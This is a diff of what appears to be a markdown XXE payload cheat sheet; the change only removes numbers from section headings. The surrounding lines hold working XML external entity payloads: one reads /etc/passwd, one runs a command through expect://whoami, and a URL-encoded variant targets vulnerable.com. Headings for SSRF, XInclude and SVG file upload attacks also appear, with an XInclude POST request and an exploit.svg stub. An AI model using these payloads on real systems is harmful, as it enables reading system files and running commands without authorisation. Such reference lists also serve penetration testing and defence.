@@ -6,7 +6,7 @@ alts: []
 render_with_liquid: true
 ---
 
-## 1. Access Local Resource
+## Access Local Resource
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config><location>&xxe;</location></config>
@@ -19,7 +19,7 @@ https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTY
 
 <br />
 
-## 2. Remote Code Execution
+## Remote Code Execution
 
 ```xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><config><location>&xxe;</location></config>
@@ -30,7 +30,7 @@ https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTY
 
 <br />
 
-## 3. SSRF attack
+## SSRF attack
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -43,7 +43,7 @@ https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTY
 
 <br />
 
-## 4. XInclude
+## XInclude
 
 ```xml
 POST /product/stock HTTP/1.1
@@ -54,7 +54,7 @@ productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="tex
 
 <br />
 
-## 5. File upload
+## File upload
 
 ```xml
 <!-- exploit.svg -->
